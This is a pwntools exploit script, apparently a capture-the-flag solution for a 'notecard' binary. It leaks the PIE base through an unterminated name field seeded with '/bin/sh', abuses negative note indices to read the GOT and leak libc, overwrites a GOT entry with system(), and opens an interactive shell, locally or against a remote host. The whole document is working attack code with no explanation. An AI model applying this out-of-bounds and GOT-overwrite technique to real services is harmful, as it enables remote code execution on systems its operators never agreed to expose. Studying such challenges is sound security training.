from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
brva 0x1564
continue
'''.format(**locals())


exe = './notecard' #change this
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
recvunt = lambda msg: io.recvuntil(msg)


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


def read(idx):
    sla(b'>', b'1')
    sla(b'(0 - 4):', str(idx).encode())
    io.recv(1)

def write(idx, data):
    sla(b'>', b'2')
    sla(b'(0 - 4):', str(idx).encode())
    s(data)

io = start()

# Login
payload = b"/bin/sh||".ljust(0x18, b"A")
sla(b'name:\n', payload)
sla(b'?\n', b'n')
recvunt(payload)
leaked_pie = u64(io.recv(6).ljust(8, b'\x00'))
elf.address = leaked_pie - 0x1270
log.info(hex(elf.address))
stdout = elf.address + 0x3fd0

payload = flat(
    stdout,
    elf.got.puts
    )

write(4, payload)
read(-6)
libc.address = u64(io.recv(6).ljust(8, b"\x00")) - 0x2046a8
log.info(hex(libc.address))

system = libc.address + 0x0000000000058740
log.info(hex(system))
write(-5, p64(system))

sla(b'>', b'0')

io.interactive()